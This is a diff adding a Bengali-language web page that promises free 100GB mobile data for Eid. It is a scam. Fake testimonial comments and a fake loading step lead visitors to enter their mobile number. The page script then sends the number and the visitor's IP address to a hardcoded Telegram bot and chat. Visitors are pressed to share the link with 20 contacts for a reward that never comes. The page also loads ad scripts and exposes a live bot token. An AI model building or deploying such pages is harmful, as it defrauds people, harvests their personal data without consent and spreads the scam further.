@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ঈদ মোবারক ফ্রি 100GB ডেটা</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    background: #f2f2f2;
+    padding-top: 50px; /* Added for top notification */
+}
+.header {
+    background: #004d40;
+    color: white;
+    text-align: center;
+    padding: 15px;
+}
+.header img {
+    width: 100%;
+    max-width: 500px;
+    border-radius: 10px;
+    border: 3px solid #fff;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+}
+.offer {
+    background: #fff;
+    margin: 10px;
+    padding: 15px;
+    border-radius: 8px;
+    text-align: center;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+.offer h2 {
+    color: #333;
+}
+.offer button {
+    background: #ff1744;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 25px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+.offer button:hover {
+    background: #d50000;
+    transform: scale(1.05);
+}
+.comments {
+    background: #fff;
+    margin: 10px;
+    padding: 15px;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+.comment {
+    border-bottom: 1px solid #ddd;
+    padding: 10px 0;
+}
+.comment:last-child {
+    border-bottom: none;
+}
+.comment strong {
+    color: #004d40;
+}
+.actions {
+    display: flex;
+    justify-content: space-between;
+    margin: 5px 0;
+}
+.like-btn, .reply-btn {
+    color: #555;
+    cursor: pointer;
+    margin-right: 10px;
+    font-size: 14px;
+    transition: all 0.2s;
+}
+.like-btn:hover, .reply-btn:hover {
+    color: #000;
+    transform: scale(1.1);
+}
+.new-comment {
+    display: flex;
+    margin-top: 10px;
+}
+.new-comment input {
+    flex: 1;
+    padding: 8px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+}
+.new-comment button {
+    background: #00796b;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    margin-left: 5px;
+    padding: 8px 15px;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+.new-comment button:hover {
+    background: #004d40;
+}
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0,0,0,0.7);
+    animation: fadeIn 0.3s;
+}
+@keyframes fadeIn {
+    from {opacity: 0;}
+    to {opacity: 1;}
+}
+.modal-content {
+    background-color: #fefefe;
+    margin: 10% auto;
+    padding: 25px;
+    border-radius: 10px;
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    animation: slideIn 0.3s;
+}
+@keyframes slideIn {
+    from {transform: translateY(-50px); opacity: 0;}
+    to {transform: translateY(0); opacity: 1;}
+}
+.loader {
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #004d40;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 2s linear infinite;
+    margin: 20px auto;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.task-container {
+    margin-top: 20px;
+}
+.task-container h3 {
+    color: #004d40;
+    margin-bottom: 15px;
+}
+.share-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    margin-top: 20px;
+    flex-wrap: wrap;
+}
+.share-btn {
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    color: white;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s;
+    min-width: 120px;
+}
+.share-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 3px 6px rgba(0,0,0,0.2);
+}
+.messenger {
+    background-color: #0084ff;
+}
+.whatsapp {
+    background-color: #25D366;
+}
+.telegram {
+    background-color: #0088cc;
+}
+.progress-container {
+    width: 100%;
+    background-color: #ddd;
+    border-radius: 5px;
+    margin-top: 20px;
+    overflow: hidden;
+}
+.progress-bar {
+    height: 25px;
+    background: linear-gradient(90deg, #004d40, #00796b);
+    border-radius: 5px;
+    width: 0%;
+    text-align: center;
+    color: white;
+    font-size: 14px;
+    line-height: 25px;
+    transition: width 0.5s ease;
+}
+.close-btn {
+    background: #ff1744;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    margin-top: 20px;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+.close-btn:hover {
+    background: #d50000;
+    transform: scale(1.05);
+}
+.ad-container {
+    margin: 15px auto;
+    text-align: center;
+    padding: 10px;
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+.footer {
+    text-align: center;
+    padding: 20px;
+    background: #004d40;
+    color: white;
+    margin-top: 20px;
+}
+.input-field {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 16px;
+    box-sizing: border-box;
+}
+.submit-btn {
+    background: #004d40;
+    color: white;
+    padding: 12px 25px;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: all 0.3s;
+    width: 100%;
+}
+.submit-btn:hover {
+    background: #00796b;
+    transform: scale(1.02);
+}
+
+/* Top Notification Bar */
+.top-notification {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    background: linear-gradient(90deg, #0088cc, #004d40);
+    color: white;
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    z-index: 9999;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    transform: translateY(-100%);
+    transition: transform 0.4s ease-out;
+}
+.top-notification.show {
+    transform: translateY(0);
+}
+.top-notification .message {
+    flex: 1;
+    margin-right: 15px;
+    font-size: 15px;
+    text-align: center;
+}
+.top-notification .join-btn {
+    background: white;
+    color: #0088cc;
+    padding: 8px 15px;
+    border-radius: 20px;
+    font-weight: bold;
+    text-decoration: none;
+    white-space: nowrap;
+    margin-right: 10px;
+    transition: all 0.3s;
+}
+.top-notification .join-btn:hover {
+    background: #f0f0f0;
+    transform: scale(1.05);
+}
+.top-notification .close-btn-notification {
+    background: transparent;
+    color: white;
+    border: none;
+    font-size: 20px;
+    cursor: pointer;
+    transition: all 0.2s;
+}
+.top-notification .close-btn-notification:hover {
+    transform: scale(1.2);
+}
+
+/* Bottom Telegram Notification Bar */
+.telegram-notification {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: #0088cc;
+    color: white;
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    z-index: 999;
+    box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
+    transform: translateY(100%);
+    transition: transform 0.3s ease;
+}
+.telegram-notification.show {
+    transform: translateY(0);
+}
+.telegram-notification .message {
+    flex: 1;
+    margin-right: 15px;
+}
+.telegram-notification .join-btn {
+    background: white;
+    color: #0088cc;
+    padding: 8px 15px;
+    border-radius: 20px;
+    font-weight: bold;
+    text-decoration: none;
+    white-space: nowrap;
+}
+.telegram-notification .close-btn-telegram {
+    background: transparent;
+    color: white;
+    border: none;
+    font-size: 20px;
+    margin-left: 15px;
+    cursor: pointer;
+}
+</style>
+</head>
+<body>
+
+<!-- Top Notification Bar -->
+<div class="top-notification" id="topNotification">
+    <div class="message">🔔 আমাদের টেলিগ্রাম চ্যানেলে জয়েন করুন এবং 100GB ফ্রি ডেটা অফারের প্রুফ দেখুন! 🔔</div>
+    <a href="https://t.me/freedatamobile" target="_blank" class="join-btn">জয়েন করুন</a>
+    <button class="close-btn-notification" onclick="closeTopNotification()">×</button>
+</div>
+
+<!-- Bottom Telegram Notification Bar -->
+<div class="telegram-notification" id="telegramNotification">
+    <div class="message">আমাদের টেলিগ্রাম চ্যানেলে জয়েন করুন ফ্রি ডেটা পেতে!</div>
+    <a href="https://t.me/freedatamobile" target="_blank" class="join-btn">জয়েন করুন</a>
+    <button class="close-btn-telegram" onclick="closeTelegramNotification()">×</button>
+</div>
+
+<div class="ad-container">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : '97410393392868a1571d2783d2036314',
+            'format' : 'iframe',
+            'height' : 50,
+            'width' : 320,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="//www.highperformanceformat.com/97410393392868a1571d2783d2036314/invoke.js"></script>
+</div>
+
+<div class="header">
+    <img src="https://img.freepik.com/premium-vector/eid-mubarak-bangla-typography-eid-background-design_134345-185.jpg" alt="ঈদ মোবারক ব্যানার">
+    <h1>ঈদ মোবারক! সমস্ত নেটওয়ার্কে ১০০GB ফ্রি ডেটা</h1>
+</div>
+
+<div class="offer">
+    <h2>সমস্ত নেটওয়ার্কের জন্য বিনামূল্যে 100GB ডেটা প্ল্যান!</h2>
+    <button onclick="showLoading()">CLICK HERE</button>
+    <p>Adi and Esther Nurul · <span id="likeCount">154k</span> comments · 338 share</p>
+</div>
+
+<div class="ad-container">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : '97410393392868a1571d2783d2036314',
+            'format' : 'iframe',
+            'height' : 50,
+            'width' : 320,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="//www.highperformanceformat.com/97410393392868a1571d2783d2036314/invoke.js"></script>
+</div>
+
+<div class="comments" id="comments">
+    <div class="comment">
+        <strong>Hasan Mahmud:</strong> আমি খুব খুশি। আমি সত্যিই এই উপহার পেয়েছি। ঈদ মোবারক!
+        <div class="actions">
+            <span class="like-btn" onclick="likeComment(this)">Like</span>
+            <span class="reply-btn" onclick="replyComment(this)">Reply</span>
+        </div>
+    </div>
+    <div class="comment">
+        <strong>Aminul Islam:</strong> ঈদ মোবারক! এই বিশেষ দিনে সবার জন্য ধন্যবাদ।
+        <div class="actions">
+            <span class="like-btn" onclick="likeComment(this)">Like</span>
+            <span class="reply-btn" onclick="replyComment(this)">Reply</span>
+        </div>
+    </div>
+    <div class="comment">
+        <strong>Farzana Rahman:</strong> I am disappointed, I got only 75GB!
+        <div class="actions">
+            <span class="like-btn" onclick="likeComment(this)">Like</span>
+            <span class="reply-btn" onclick="replyComment(this)">Reply</span>
+        </div>
+    </div>
+    <div class="comment">
+        <strong>Nafisa Begum:</strong> আশ্চর্য… তুমিও কি আমার মতো ১০০ জিবি পেয়েছ?
+        <div class="actions">
+            <span class="like-btn" onclick="likeComment(this)">Like</span>
+            <span class="reply-btn" onclick="replyComment(this)">Reply</span>
+        </div>
+    </div>
+    <div class="comment">
+        <strong>Shahidul Alam:</strong> এই সময়ে এই 100GB পাওয়ার জন্য ধন্যবাদ।
+        <div class="actions">
+            <span class="like-btn" onclick="likeComment(this)">Like</span>
+            <span class="reply-btn" onclick="replyComment(this)">Reply</span>
+        </div>
+    </div>
+</div>
+
+<div class="ad-container">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : '97410393392868a1571d2783d2036314',
+            'format' : 'iframe',
+            'height' : 50,
+            'width' : 320,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="//www.highperformanceformat.com/97410393392868a1571d2783d2036314/invoke.js"></script>
+</div>
+
+<div class="new-comment">
+    <input type="text" id="newCommentInput" placeholder="Write a comment...">
+    <button onclick="postComment()">Post</button>
+</div>
+
+<div class="ad-container">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : '97410393392868a1571d2783d2036314',
+            'format' : 'iframe',
+            'height' : 50,
+            'width' : 320,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="//www.highperformanceformat.com/97410393392868a1571d2783d2036314/invoke.js"></script>
+</div>
+
+<div class="footer">
+    <script async="async" data-cfasync="false" src="//pl26814561.profitableratecpm.com/576a0b5dfc8e7d28097b7fa56b9052a4/invoke.js"></script>
+    <div id="container-576a0b5dfc8e7d28097b7fa56b9052a4"></div>
+</div>
+
+<div id="loadingModal" class="modal">
+    <div class="modal-content" id="loadingContent">
+        <div class="loader" id="loader"></div>
+        <p id="loadingText">প্রক্রিয়া করা হচ্ছে...</p>
+    </div>
+</div>
+
+<div id="mobileModal" class="modal">
+    <div class="modal-content">
+        <h3>Enter your mobile number</h3>
+        <input type="text" id="mobileNumber" class="input-field" placeholder="Mobile number">
+        <button onclick="submitMobileNumber()" class="submit-btn">Submit</button>
+    </div>
+</div>
+
+<div id="taskModal" class="modal">
+    <div class="modal-content">
+        <h3>শেয়ার করুন আপনার task কমপ্লিট হবে</h3>
+        <p>এই লিংকটি ২০ জনের সাথে শেয়ার করুন:</p>
+        <p id="shareLink">https://earnup360.github.io/100gb-Free/</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar">0/20</div>
+        </div>
+        
+        <div class="share-buttons">
+            <button class="share-btn messenger" onclick="shareToMessenger()">Messenger</button>
+            <button class="share-btn whatsapp" onclick="shareToWhatsApp()">WhatsApp</button>
+            <button class="share-btn telegram" onclick="shareToTelegram()">Telegram</button>
+        </div>
+        
+        <p id="taskStatus" style="margin-top: 15px;"></p>
+    </div>
+</div>
+
+<div id="completeModal" class="modal">
+    <div class="modal-content">
+        <h3>অভিনন্দন!</h3>
+        <p>আপনি সফলভাবে টাস্কটি সম্পন্ন করেছেন।</p>
+        <p>কিছু সময় অপেক্ষা করুন আপনাকে ১০০ জিবি ফ্রিতে দিয়ে দেওয়া হবে</p>
+        <button class="close-btn" onclick="closeCompleteModal()">Close</button>
+    </div>
+</div>
+
+<script>
+// টেলিগ্রাম বট কনফিগারেশন
+const telegramBotToken = "7665711436:AAEMnIPnEHZRcEskgshKkd5YCvwR8e-LlN4";
+const chatId = "7889474032"; // আপনার চ্যাট আইডি (আপডেট করা হয়েছে)
+const telegramChannelLink = "https://t.me/freedatamobile";
+
+let shareCount = 0;
+const totalRequired = 20;
+const shareLink = "https://earnup360.github.io/100gb-Free/";
+
+// Check if user has joined Telegram (using localStorage)
+function hasJoinedTelegram() {
+    return localStorage.getItem('joinedTelegram') === 'true';
+}
+
+function setJoinedTelegram() {
+    localStorage.setItem('joinedTelegram', 'true');
+    hideTelegramNotification();
+    hideTopNotification();
+}
+
+// Top notification functions
+function showTopNotification() {
+    if (!hasJoinedTelegram()) {
+        const notification = document.getElementById('topNotification');
+        setTimeout(() => {
+            notification.classList.add('show');
+        }, 1000); // Show after 1 second delay
+    }
+}
+
+function hideTopNotification() {
+    const notification = document.getElementById('topNotification');
+    notification.classList.remove('show');
+}
+
+function closeTopNotification() {
+    hideTopNotification();
+    // Show again after 1 hour if not joined
+    setTimeout(() => {
+        if (!hasJoinedTelegram()) {
+            showTopNotification();
+        }
+    }, 3600000); // 1 hour
+}
+
+// Telegram notification functions
+function showTelegramNotification() {
+    if (!hasJoinedTelegram()) {
+        const notification = document.getElementById('telegramNotification');
+        setTimeout(() => {
+            notification.classList.add('show');
+        }, 5000); // Show after 5 seconds
+    }
+}
+
+function hideTelegramNotification() {
+    const notification = document.getElementById('telegramNotification');
+    notification.classList.remove('show');
+}
+
+function closeTelegramNotification() {
+    hideTelegramNotification();
+    // Show again after 30 seconds
+    setTimeout(showTelegramNotification, 30000);
+}
+
+// Show notifications when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    showTopNotification();
+    showTelegramNotification();
+});
+
+// Set interval to show bottom notification every 5 minutes if not joined
+setInterval(() => {
+    if (!hasJoinedTelegram()) {
+        showTelegramNotification();
+    }
+}, 300000); // 5 minutes
+
+function likeComment(el) {
+    if(el.classList.contains('liked')){
+        el.classList.remove('liked');
+        el.innerText = 'Like';
+    } else {
+        el.classList.add('liked');
+        el.innerText = 'Liked';
+    }
+}
+
+function replyComment(el) {
+    const reply = prompt('Write your reply:');
+    if(reply){
+        const newReply = document.createElement('div');
+        newReply.classList.add('comment');
+        newReply.innerHTML = `<strong>You:</strong> ${reply}<div class="actions"><span class="like-btn" onclick="likeComment(this)">Like</span> <span class="reply-btn" onclick="replyComment(this)">Reply</span></div>`;
+        el.parentElement.parentElement.after(newReply);
+    }
+}
+
+function postComment() {
+    const input = document.getElementById('newCommentInput');
+    const text = input.value.trim();
+    if(text){
+        const newComment = document.createElement('div');
+        newComment.classList.add('comment');
+        newComment.innerHTML = `<strong>You:</strong> ${text}<div class="actions"><span class="like-btn" onclick="likeComment(this)">Like</span> <span class="reply-btn" onclick="replyComment(this)">Reply</span></div>`;
+        document.getElementById('comments').appendChild(newComment);
+        input.value = '';
+    }
+}
+
+function showLoading() {
+    const modal = document.getElementById('loadingModal');
+    const content = document.getElementById('loadingContent');
+    
+    modal.style.display = 'block';
+    content.innerHTML = `
+        <div class="loader"></div>
+        <p id="loadingText">প্রক্রিয়া করা হচ্ছে...</p>
+    `;
+    
+    setTimeout(() => {
+        showMobileNumberModal();
+        modal.style.display = 'none';
+    }, 2000);
+}
+
+function showMobileNumberModal() {
+    document.getElementById('mobileModal').style.display = 'block';
+}
+
+async function submitMobileNumber() {
+    const mobileNumber = document.getElementById('mobileNumber').value.trim();
+    
+    if(!mobileNumber) {
+        alert('দয়া করে একটি বৈধ মোবাইল নম্বর লিখুন');
+        return;
+    }
+
+    const mobileRegex = /^(?:\+88|01)?(?:\d{11}|\d{13})$/;
+    if(!mobileRegex.test(mobileNumber)) {
+        alert('সঠিক বাংলাদেশি মোবাইল নম্বর লিখুন (01XXXXXXXXX ফরম্যাটে)');
+        return;
+    }
+
+    try {
+        // Show loading while sending
+        document.getElementById('mobileModal').style.display = 'none';
+        document.getElementById('loadingModal').style.display = 'block';
+        document.getElementById('loadingContent').innerHTML = `
+            <div class="loader"></div>
+            <p id="loadingText">মোবাইল নম্বর পাঠানো হচ্ছে...</p>
+        `;
+        
+        // Send to Telegram
+        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `🔔 নতুন মোবাইল নম্বর সাবমিট 🔔\n\n📱 নম্বর: ${mobileNumber}\n⏰ সময়: ${new Date().toLocaleString()}\n🌐 IP: ${await getIPAddress()}`
+            })
+        });
+
+        if(response.ok) {
+            document.getElementById('loadingModal').style.display = 'none';
+            showTaskModal();
+            
+            // Also send a confirmation to user's Telegram if available
+            try {
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: mobileNumber.startsWith('+') ? mobileNumber : `+88${mobileNumber}`,
+                        text: `ধন্যবাদ! আপনার মোবাইল নম্বর সফলভাবে রেজিস্টার্ড হয়েছে। 100GB ফ্রি ডেটা পেতে আমাদের টেলিগ্রাম চ্যানেলে জয়েন করুন: ${telegramChannelLink}`
+                    })
+                });
+            } catch (e) {
+                console.log("Couldn't send confirmation to user");
+            }
+            
+        } else {
+            const errorData = await response.json();
+            throw new Error(errorData.description || 'টেলিগ্রামে মেসেজ পাঠাতে ব্যর্থ');
+        }
+        
+    } catch (error) {
+        console.error('ত্রুটি:', error);
+        document.getElementById('loadingModal').style.display = 'none';
+        alert('মোবাইল নম্বর সাবমিট করতে সমস্যা হয়েছে। পরে আবার চেষ্টা করুন।');
+        showTaskModal(); // Continue to task modal even if Telegram fails
+    }
+}
+
+// Function to get user's IP address
+async function getIPAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        return "IP অজানা";
+    }
+}
+
+function showTaskModal() {
+    document.getElementById('taskModal').style.display = 'block';
+    updateProgress();
+}
+
+function updateProgress() {
+    const progressBar = document.getElementById('progressBar');
+    const percentage = (shareCount / totalRequired) * 100;
+    progressBar.style.width = `${percentage}%`;
+    progressBar.textContent = `${shareCount}/${totalRequired}`;
+    
+    const taskStatus = document.getElementById('taskStatus');
+    if(shareCount >= totalRequired) {
+        taskStatus.textContent = "টাস্ক সম্পন্ন!";
+        setTimeout(() => {
+            document.getElementById('taskModal').style.display = 'none';
+            document.getElementById('completeModal').style.display = 'block';
+        }, 1000);
+    } else {
+        taskStatus.textContent = `আরও ${totalRequired - shareCount} বার শেয়ার করুন`;
+    }
+}
+
+function shareToMessenger() {
+    shareCount++;
+    updateProgress();
+    const shareMessage = `⭕ আসসালামু আলাইকুম ⭕\n\n🌐 আমি ফ্রিতে ১০০ জিবি পেয়েছি । তাই আপনাকে লিংকটি শেয়ার করলাম । ঈদের সালামি নিন 👇👇👇👇\n${shareLink}\n\n🔴 আমাদের প্রমাণ দেখতে চান জয়েন করুন :-\n${telegramChannelLink}\n\nঈদ মোবারক`;
+    
+    // Check if mobile device
+    if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        // Try to open Messenger app directly
+        window.open(`fb-messenger://share?link=${encodeURIComponent(shareLink)}&app_id=`, '_blank');
+        
+        // Fallback to web version if app not installed
+        setTimeout(() => {
+            window.location.href = `https://www.facebook.com/dialog/send?app_id=&link=${encodeURIComponent(shareLink)}&redirect_uri=${encodeURIComponent(window.location.href)}`;
+        }, 500);
+    } else {
+        // Desktop version - open in new tab
+        window.open(`https://www.facebook.com/dialog/send?app_id=&link=${encodeURIComponent(shareLink)}&redirect_uri=${encodeURIComponent(window.location.href)}`, '_blank');
+    }
+}
+
+function shareToWhatsApp() {
+    shareCount++;
+    updateProgress();
+    const shareMessage = `⭕ আসসালামু আলাইকুম ⭕\n\n🌐 আমি ফ্রিতে ১০০ জিবি পেয়েছি । তাই আপনাকে লিংকটি শেয়ার করলাম । ঈদের সালামি নিন 👇👇👇👇\n${shareLink}\n\n🔴 আমাদের প্রমাণ দেখতে চান জয়েন করুন :-\n${telegramChannelLink}\n\nঈদ মোবারক`;
+    window.open(`https://wa.me/?text=${encodeURIComponent(shareMessage)}`, '_blank');
+}
+
+function shareToTelegram() {
+    shareCount++;
+    updateProgress();
+    const shareMessage = `⭕ আসসালামু আলাইকুম ⭕\n\n🌐 আমি ফ্রিতে ১০০ জিবি পেয়েছি । তাই আপনাকে লিংকটি শেয়ার করলাম । ঈদের সালামি নিন 👇👇👇👇\n${shareLink}\n\n🔴 আমাদের প্রমাণ দেখতে চান জয়েন করুন :-\n${telegramChannelLink}\n\nঈদ মোবারক`;
+    window.open(`https://t.me/share/url?url=${encodeURIComponent(shareLink)}&text=${encodeURIComponent(shareMessage)}`, '_blank');
+}
+
+function closeCompleteModal() {
+    document.getElementById('completeModal').style.display = 'none';
+    shareCount = 0;
+}
+
+window.onclick = function(event) {
+    if (event.target.className === 'modal') {
+        event.target.style.display = 'none';
+    }
+}
+</script>
+
+</body>
+</html>
